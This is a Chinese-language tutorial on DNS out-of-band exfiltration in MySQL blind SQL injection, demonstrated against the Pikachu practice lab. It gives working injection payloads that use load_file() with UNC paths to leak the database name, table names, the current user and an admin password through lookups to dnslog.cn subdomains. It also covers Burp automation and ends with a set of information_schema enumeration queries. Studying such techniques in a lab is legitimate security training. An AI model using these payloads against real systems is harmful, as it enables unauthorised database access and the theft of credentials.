MYSQL盲注之dns外带注入
2022-03-02 19:04:42

前言

在进行SQL注入中遇到当遇到布尔盲注或者时间注入时，需要对利用手工或编写一些脚本进行对数据库的字段的判断，但是这过程中往往会耗费大量的时间，还有可能因为WFA造成IP被封堵。

由于以上的原因便产生出了DNSlog注入，原理大致为：当我们输入域名时，会向DNS服务器解析获取IP在通过IP访问，在这过程中DNS服务器会产生对域名请求解析的日志，比如此时存在一个域名为summer.com，要使用的payload为`whoami`.summer.com，就可以通过DNS解析日志来获取到主机名。

设置MYSQL数据库的环境

了解什么是UNC

官方说法就是：UNC是一种命名惯例, 主要用于在Microsoft Windows上指定和映射网络驱动器. UNC命名惯例最多被应用于在局域网中访问文件服务器或者打印机。

格式：UNC命名由三个部分组成- 服务器名, 共享名, 和一个可选的文件路径，\\server\share\file_path。

在域渗透中，我们经常使用 dir \\ip\\c$ 去尝试访问有没有权限，实际上这就是利用UNC访问。

设置Load_file状态

在MySQL注入中DNSlog外带主要利用MySQL内置函数load_file()函数，load_file()不仅能读取本地文件也能通过UNC的方式读取远程文件。

Load_file函数状态：

当secure_file_priv为空，则表示没有任何限制。

当secure_file_priv为指定目录，则表示数据库导入导出只能在指定目录。

当secure_file_priv为null，则表示不允许导入导出（MySQL 5.7 默认值）

MySQL中查询secure_file_priv有以下方式

show variables like '%secure%';


select @@global.secure_file_priv;

这里需要将null改为空，修改my.ini文件，增加一行语句secure_file_priv=''

重启mysql服务

同时在这里需要注意的是load_file()函数默认情况下root权限才可以使用，普通用户权限无法使用。

DNSlog外带注入测试

测试注入点是否支持dns外带数据，这里使用的是pikachu靶场环境﻿

1' union select 1,2 and sleep(10)#             (burp重放需要注意url编码)

猜解到字段数为2，然后测试是否支持dns外带数据

1' union select 1,load_file('\\\\t1.9hg8iv.dnslog.cn\\abc') and sleep(10)#

可以看到t1的被带了出来

查询当前数据库名

1' union select 1,load_file(concat('\\\\',(select database()),'.9hg8iv.dnslog.cn\\abc'))#

猜解第一个表名

1' union select 1,load_file(concat('\\\\',(select table_name from information_schema.tables where table_schema="pikachu" limit 0,1),'.9hg8iv.dnslog.cn\\abc'))#

先查表的数量，然后通过burp进行批量猜解

1' union select 1,load_file(concat('\\\\',(select COUNT(table_name) from information_schema.tables where table_schema="pikachu" limit 0,1),'.9hg8iv.dnslog.cn\\abc'))#

burp设置

limit 0，1 后面的0设置为变量

payload设置

线程设置为1

点击攻击

结果为（环境原因修改了dns）

其他的按着常规步骤一步一步来，最后的查询密码

1' union select 1, load_file(concat('\\\\',(select password from users where username = "admin" limit 0,1),'.87kmrg.dnslog.cn\\abc'))#

需要注意的是很多数据库字段的值可能是有特殊符号的，这些特殊符号拼接在域名里是无法做dns查询的，因为域名是有一定的规范，有些特殊符号是不能带入的，例如用户user(),需要使用hex()进行编码才能回显到dnslog

1' union select 1, load_file(concat('\\\\',(select user()),'.87kmrg.dnslog.cn\\abc'))#

利用if语句进行dnslog注入查询

查询当前数据库名

1' and if((select load_file(concat('\\\\',(select database()),'.n5bu0y.dnslog.cn\\abc'))),1,0)#

查询数据库名（注意当库太多时字符串超出dns查询长度63个字符时无法回显需加limit参数），配合burp爆破

1' union select 1, load_file(concat('\\\\',(select password from users where username = "admin" limit 0,1),'.87kmrg.dnslog.cn\\abc'))#

修改limit参数为变量

整个流程中用到的sql查询语句

#爆库： 
#显示库中第一个库的库名：
select schema_name from information_schema.schemata limit 0,1;
#显示库中第二个库的库名：
select schema_name from information_schema.schemata limit 1,1;
 
#爆表：
#显示security库中第一个表的表名：
select table_name from information_schema.tables where table_schema='security' limit 0,1;
#显示security库中所有表的表名：
select group_concat(table_name) from information_schema.tables where table_schema='security';
 
#爆字段：
#显示users表中第一个字段名：
select column_name from information_schema.columns where table_name='users' limit 0,1;
#显示users表中第二个字段名：
select column_name from information_schema.columns where table_name='users' limit 1,1;
#显示users表中所有字段名：
select group_concat(column_name) from information_schema.columns where table_name='users';
 
#爆数据：
#users表中第一个用户的username
select username from users limit 0,1;
#users表中第一个用户的password
select password from users limit 0,1;
#users表中第二个用户的username
